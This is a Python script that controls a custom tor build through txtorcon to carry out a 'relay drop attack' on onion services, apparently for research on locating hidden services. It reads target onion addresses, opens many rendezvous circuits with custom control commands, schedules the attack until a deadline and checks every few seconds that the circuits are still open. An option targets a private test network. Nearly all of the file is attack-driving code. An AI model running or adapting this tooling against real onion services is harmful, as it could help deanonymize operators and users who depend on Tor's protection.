#!/usr/bin/env python

from twisted.internet import reactor, defer, task
import txtorcon
import sys
import pdb
import os
from threading import Thread
import time
from datetime import datetime, timedelta
import argparse

defer.setDebugging(True)


parser = argparse.ArgumentParser(description="Interface to the relay drop attack")
parser.add_argument('--onion', type=str)
parser.add_argument('--nbrcircuits', type=int)
parser.add_argument('--until', type=str)
parser.add_argument('--bandwidth', type=int,default=500, help="in KBytes/s")
parser.add_argument('--chutneynodepath', type=str, help="Base dir of the network (~?chutney/net/nodes[timestamp]/). The private network should already be up and running")

DataDirectory = '/home/frochet/Documents/Tor/tor_hs_localization/hs_attack/tor/exec'
torBin = '/home/frochet/Documents/Tor/tor_hs_localization/hs_attack/tor/exec/bin/tor'


def configure_auth(chutneypath, config):
    config.DirAuthority = []
    if not chutneypath.endswith('/'):
        chutneypath += '/'
    with open(os.path.join(chutneypath, "000a/torrc"), 'r') as f:
        for line in f:
            if line.startswith("DirAuthority"):
                config.DirAuthority.append(line.split('DirAuthority')[1])


def setup(tor_proto):
  pass

def setup_failed(arg):
  pass

#helper

def totimestamp(dt, epoch=datetime(1970, 1, 1)):
    td = dt - epoch
    return (td.microseconds + (td.seconds + td.days * 86400)* 10**6) / 10**6

class HS_rd_attack():
  """
  Schedule the attack and store information about targeted
  onion service(s); time elapsed during the attack; stats infos
  """

  def hs_attack_retry_intro_callback(self, m):
    print m
    #pdb.set_trace()
    def callback_i(onion_address):
      #time.sleep(5)
      print "Retrying RDV establishment"
      self.launch(onion_address)
    #t = Thread(target=callback, args=(self.current_target,))
    #t.start()
    ##time.sleep(3)
    #reactor.callLater(3, self.launch, self.current_target)
    reactor.callLater(3.0, callback_i, self.current_target)
    #self.launch(self.current_target)
  def hs_attack_ready_callback(self, e):
    print "Circuits are established ... Scheduling the attack until {0}...".format(self.t_until)
    r = self.process.tor_protocol.queue_command('SEND_RD {0}'.format(self.t_until))
    return r
  def hs_attack_info_callback(self, i):
    if "HS_ATTACK" in i or "rendcirc" in i:
      print "INFO:", i
  def hs_attack_debug_callback(self, d):
    if "HS_ATTACK" in d:
        print "DEBUG", d
  def hs_attack_next_onion_callback():
    pass

  def __init__(self, process, onionaddr_file, nbr_circs, t_until):
    self.onions = []
    self.nbr_circs = nbr_circs
    self.process = process
    self.t_until = t_until
    for line in open(onionaddr_file):
      line = line[:-1] #remove return line character
      self.onions.append(line)
    print 'Setting event listeners'
    process.tor_protocol.add_event_listener('HS_ATTACK_READY', self.hs_attack_ready_callback)
    process.tor_protocol.add_event_listener('HS_ATTACK_RETRY_INTRO',
            self.hs_attack_retry_intro_callback)
    process.tor_protocol.add_event_listener('HS_ATTACK_MONITOR_HEALTHINESS', self.monitor_attack_healthiness_callback)
    process.tor_protocol.add_event_listener('INFO', self.hs_attack_info_callback)
    process.tor_protocol.add_event_listener('DEBUG', self.hs_attack_debug_callback)
    #process.protocol.add_event_listener('HS_ATTACK_NEXT', hs_attack_next_onion_callback)
    #schedule the attack
    self.current_target = self.onions.pop()
    print 'launch attack on %s'%self.current_target
    self.launch(self.current_target)
    self.monitor = task.LoopingCall(self.monitor_attack_healthiness)
    self.monitor.start(5.0)

  def launch(self, onion_address):
    print 'Sending command ESTABLISH_RDV to %s through %d rendezvous circuits' %(onion_address, self.nbr_circs) 
    r = self.process.tor_protocol.queue_command('ESTABLISH_RDV %s %d' % (onion_address, self.nbr_circs))
    #return r
  
  def monitor_attack_healthiness_callback(self, e):
      print "monitor callback - todo: display info"

  def monitor_attack_healthiness(self):
    """
    Check every 10 seconds whether there are self.nbr_circs opened. Launch new circs if not.
    """
    #def callback_m():
      ##time.sleep(10)
      #print 'Checking attack healthiness ...'
      #self.process.tor_protocol.queue_command('MONITOR_HEALTH')
    ##t = Thread(target=callback)
    ##t.start()
    #d = defer.Deferred()
    ##reactor.callLater(10, self.process.tor_protocol.queue_command, 'MONITOR_HEALTH')
    #d.addCallback(callback_m)
    #reactor.callLater(10, d.callback)
    #return d
    print 'Checking attack healthiness ...'
    self.process.tor_protocol.queue_command('MONITOR_HEALTH')

def launched(process_proto):
  print "Tor has launched."
  rd_attack = HS_rd_attack(process_proto, onionaddr_file, nbr_circs, t_until)
  #reactor.stop()


def error(failure): 
  print "There was an error", failure.getErrorMessage()
  reactor.stop()

def progress(percent, tag, summary):
  ticks = int((percent/100.0) * 10.0)
  prog = (ticks * '#') + ((10 - ticks) * '.') 
  print '%s %s' % (prog, summary)

if __name__ == "__main__":
  args = parser.parse_args()

  onionaddr_file = args.onion
  nbr_circs = args.nbrcircuits
  t_until = args.until.split('-') #format: YY-MM-DD-hh-mm
  if len(t_until) != 5:
      print("the date has not a valid format. Must be YY-MM-DD-hh-mm")
      sys.exit(-1)
  #sockport = int(sys.argv[4])
  sockport = 9052
  controlport = 9053
  #controlport = int(sys.argv[5])
  t_until = datetime(int(t_until[0]), int(t_until[1]), int(t_until[2]), int(t_until[3]), int(t_until[4]), 0)
  t_until = totimestamp(t_until)
  if totimestamp(datetime.utcnow()) > t_until:
      print("Back to the future happens only in movies...")
      sys.exit(-1)
  
  #pdb.set_trace()
  config = txtorcon.TorConfig()
  config.SOCKSPort = sockport
  config.DataDirectory = DataDirectory
  config.UseEntryGuards = 0
  config.MaxCircuitDirtiness = 4*60*60
  config.ControlPort = controlport
  config.RunAsDaemon = 0
  config.BandwidthRate = "{0} KB".format(args.bandwidth)
  config.NewCircuitPeriod = 60*60*24
  if args.chutneynodepath:
      configure_auth(args.chutneynodepath, config)
      config.TestingTorNetwork = 1
      #config.EnforceDistinctSubnets = 0
      #config.AuthDirMaxServersPerAddr = 0
      #config.AuthDirMaxServersPerAuthAddr = 0
      #config.ClientDNSRejectInternalAddresses = 0
      #config.ClientRejectInternalAddresses = 0
      #config.ExtendAllowPrivateAddresses = 1
  ##config.Log = "[circ]notice file circlog.log debug info stdout"
  config.Log = ["info stdout", "debug file debug.log"]
  config.save()
  try:
    os.mkdir(DataDirectory)
  except OSError:
    pass 
  try:
    d = txtorcon.launch_tor(
        config, reactor, tor_binary=torBin, progress_updates=progress)
  except Exception as e:
    print("Error when launching tor: ", e)
    sys.exit(-1)
  #set up listening events and callback methods
  d.addCallback(launched).addErrback(error)
  
  reactor.run()
